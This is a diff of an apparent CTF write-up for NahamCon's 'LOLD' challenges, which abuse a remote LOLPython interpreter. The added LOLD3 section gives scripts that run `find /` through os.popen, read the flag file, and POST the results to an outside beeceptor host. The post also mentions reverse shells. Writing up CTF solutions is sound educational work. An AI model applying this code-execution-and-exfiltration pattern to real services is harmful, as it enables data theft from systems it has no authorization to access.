@@ -25,17 +25,10 @@ S CAN HAS F OWN read THING
 VISIBLE S
 ```
 
-I'm so sorry, for some reason my syntax highlighter doesn't support LOLPython.  I'll file a bug.  So for an explanation:
+I'm so sorry, for some reason my syntax highlighter doesn't support LOLPython.  I'll file a bug.  In the meantime here's the first line in red with the python it turns in to in blue below.
 
-- The first line opens the file "flag.txt" and stores the handle in `F`.  To break this line down further:
-  - `F` is the variable
-  - `CAN HAS` is `=`
-  - `open` is the python `open` function 
-  - `WIT` is `(`
-  - "flag.txt" is the file name
-  - `!` is `)`
-  - So the line when converted reads `F = open("flag.txt)`
-  - You can download the attached lolpython.py file to see other fun things you can do in the language, but you're also welcome to just take my word for it
+![lold to python]({{ site.url }}/assets/post-images/nahamcon-lold/lold1-to-python.png)
+
 - Line 2 calls read on F (I'll skip the bits we've already covered):
   - `OWN` is `.`
   - `THING` is `()`.  You could also use `WIT!` but I guess that doesn't make any sense in LOL speak.
@@ -81,17 +74,71 @@ R CAN HAS C OWN getresponse THING
 VISIBLE R OWN read THING
 ```
 
-OK strap in, here we go:
-- `GIMME httplib` becomes `import httplib`
-- `H CAN HAS INVISIBLE BUCKET` becomes `H = {}`
-- `H LET THE "Content-type" OK CAN HAS "text/plain"` becomes `H["Content-type"] = "text/plain"`
-- A bit of file opening and reading we've already covered
--  `C CAN HAS httplib OWN HTTPConnection WIT U!` becomes `C = httplib.HTTPConnection(U)`
-- `C OWN request WIT "POST" AND "/test" AND S AND H!` becomes `C.request("POST", "/test", S, H)`
-- `R CAN HAS C OWN getresponse THING` becomes `R = C.getresponse()`
+OK strap in, here we go (skipping the file reading we've already covered in part 1):
+
+| LOLPython         | python     |
+|--------------|-----------|
+| `GIMME httplib` | `import httplib` |
+| `H CAN HAS INVISIBLE BUCKET` | `H = {}` |
+| `H LET THE "Content-type" OK CAN HAS "text/plain"` | H["Content-type"] = "text/plain"` |
+| `C CAN HAS httplib OWN HTTPConnection WIT U!` | `C = httplib.HTTPConnection(U)` |
+| `C OWN request WIT "POST" AND "/test" AND S AND H!` | `C.request("POST", "/test", S, H)` |
+| `R CAN HAS C OWN getresponse THING` | `R = C.getresponse()`|
+
 
 So in short we read the file contents, then post it to `http://blarg.free.beeceptor.com:/test`.
 
 This then gives us the flag in beeceptor:
 
 ![lold2 result]({{ site.url }}/assets/post-images/nahamcon-lold/lold2-result.png)
+
+# LOLD3
+
+> HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! BUT URGHHHH NOW WE HAVE LOST THE FLAG!?! YOU HAZ TO FIND IT!!
+> 
+> Attachment: lolpython.py
+> 
+> Connect:
+> 
+> nc challenge.nahamcon.com 31263
+
+Very similar to part 2 except we first need to find the flag.  The bash command `find / -name flag.txt -type f 2>/dev/null` can find it, so we'll write some LOLPython to run that via `os.popen` and post the results to beeceptor:
+
+```
+GIMME httplib
+GIMME os
+
+U CAN HAS "blarg.free.beeceptor.com:80"
+H CAN HAS INVISIBLE BUCKET
+H LET THE "Content-type" OK CAN HAS "text/plain"
+O CAN HAS os OWN popen WIT "find / -name flag.txt -type f 2>/dev/null"!
+S CAN HAS O OWN read THING
+C CAN HAS httplib OWN HTTPConnection WIT U!
+C OWN request WIT "POST" AND "/test" AND S AND H!
+R CAN HAS C OWN getresponse THING
+VISIBLE R OWN read THING
+```
+
+This gives us the following flag locations:
+
+![lold3 flag locations]({{ site.url }}/assets/post-images/nahamcon-lold/lol3-flag-locations.png)
+
+We can then use the code from part 2 with the path changed to get the final flag and end this torment:
+
+```
+GIMME httplib
+
+U CAN HAS "blarg.free.beeceptor.com:80"
+H CAN HAS INVISIBLE BUCKET
+H LET THE "Content-type" OK CAN HAS "text/plain"
+F CAN HAS open WIT "/opt/challenge/flag.txt"!
+S CAN HAS F OWN read THING
+C CAN HAS httplib OWN HTTPConnection WIT U!
+C OWN request WIT "POST" AND "/test" AND S AND H!
+R CAN HAS C OWN getresponse THING
+VISIBLE R OWN read THING
+```
+
+![lold3 flag locations]({{ site.url }}/assets/post-images/nahamcon-lold/lold3-complete.png)
+
+As a side note I know some people solved 2 and 3 by creating a reverse shell in LOLPython.  I'll leave that as an exercise for whoever wants it.
